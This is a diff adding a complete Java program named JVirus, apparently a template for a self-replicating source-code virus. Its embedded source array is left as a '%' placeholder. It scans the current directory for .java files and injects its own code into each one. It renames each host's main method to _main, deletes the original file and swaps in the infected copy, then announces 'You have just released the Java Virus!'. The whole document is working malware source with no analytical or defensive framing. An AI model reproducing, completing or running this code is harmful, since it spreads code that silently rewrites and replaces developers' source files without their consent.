@@ -1,0 +1,80 @@
+import java.io.*;
+
+class JVirus {
+
+  public static void _main (String[] argv) {
+    System.out.println("You have just released the Java Virus!");
+    }
+
+  public static void main(String[] argv) {
+
+
+int k=0;
+int[] src={
+%
+};
+
+  try {
+    File lf=new File(".");
+    String[] flist=lf.list();
+    int si=0;
+    for (si=0;si<flist.length;si++) {
+      if (flist[si].indexOf(".java")>0) {
+        String is=flist[si];
+        String id=is;
+        id=id.concat(".vir");
+
+        FileInputStream fi=new FileInputStream(is);
+        PrintStream fo=new PrintStream(new FileOutputStream(id));
+        fo.print("import java.io.*;\r\n");
+        int inf=1;
+        int hstb=0;
+        byte b[]=new byte[255];
+        while (hstb!=-1) {
+          int ib=0;
+          hstb=0;
+          while ((hstb!=-1)&&(hstb!=10)) {
+            hstb=fi.read();
+            b[ib++]=(byte)(hstb & 0xFF);
+            }
+          b[ib]=0;
+          String s=new String(b,0);
+          int sid=s.indexOf("public static void main");
+          if (sid>-1) {
+            if (inf==1) inf=0;
+            for (int i=0; src[i]!=37; i++) {
+              fo.write(src[i]);
+              k=i;
+              }
+            for (int i=0; i<src.length; i++) {
+              fo.print(src[i]);
+              if (i<src.length-1) {fo.write(44); fo.write(13); fo.write(10);}
+              }
+            for (int i=k+2; i<src.length; i++) fo.write(src[i]);
+            for (int i=0; i<sid+19; i++) fo.write(b[i]);
+            fo.write('_');
+            for (int i=sid+19; i<ib; i++) fo.write(b[i]);
+            }
+          if (s.indexOf("public static void _main")>0) inf=2;
+          if (sid==-1) for (int i=0; i<ib; i++) fo.write(b[i]);
+          }
+
+        fi.close();
+        fo.close();
+        if (inf==0) {
+          File f=new File(is);
+          f.delete();
+          File g=new File(id);
+          g.renameTo(f);
+          }
+        else {
+          File g=new File(id);
+          g.delete();
+          }
+        }
+      }
+    } catch (IOException ioe) {}
+  _main(argv);
+  }
+
+}
